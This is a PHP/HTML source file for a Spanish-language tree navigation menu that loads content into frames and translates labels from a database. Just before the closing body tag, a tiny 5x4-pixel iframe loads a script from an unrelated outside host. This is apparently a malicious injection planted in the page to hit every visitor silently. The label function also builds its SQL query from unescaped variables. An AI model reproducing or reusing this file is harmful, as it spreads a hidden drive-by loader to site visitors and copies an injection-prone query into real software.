<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

?>
<HTML>
<HEAD><TITLE>Menú de navegación estilo árbol</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function cambiarsub(item,cod,t) {
	parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
	parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=1&menu=0&id_sub_sel='+cod;

}

function cambiar(item,cod,tit) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	if(cod>0){
		//parent.frames['centro'].location='../carga_contenido.php?id_sel='+cod+'&tit='+tit
		parent.frames['centro'].location='../perfil.php?id_sel='+cod+'&tit='+tit
	}
	
}

function abretodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="block";
   }
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
   }
}

</script>
</HEAD>
<BODY class="fondito">

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"  height="19"><small><small>&nbsp;</small></small></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiar('uno',193,'<?=traducemenu(193)?>');"><?=traducemenu(193)?></a></td>
  </tr>
</table>

<div id="uno" style="display: none; margin-left: 0em;">
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2" href="javascript:cambiarsub('',161,'<?=traducemenu(161)?>');"><?=traducemenu(161)?></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a class="link2" href="javascript:cambiarsub('',162,'<?=traducemenu(162)?>');"><?=traducemenu(162)?></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
  <td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
    <td><a  class="link2" href="javascript:cambiarsub('',163,'<?=traducemenu(163)?>');"><?=traducemenu(163)?></a></td>
  </tr>
</table>
</div>

</td></tr></table>
<p>
  <script>
//120
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../perfil.php?id_sel=1&tit=<?=traducemenu(1)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=1';

</script>
</p>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HTML>

<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>
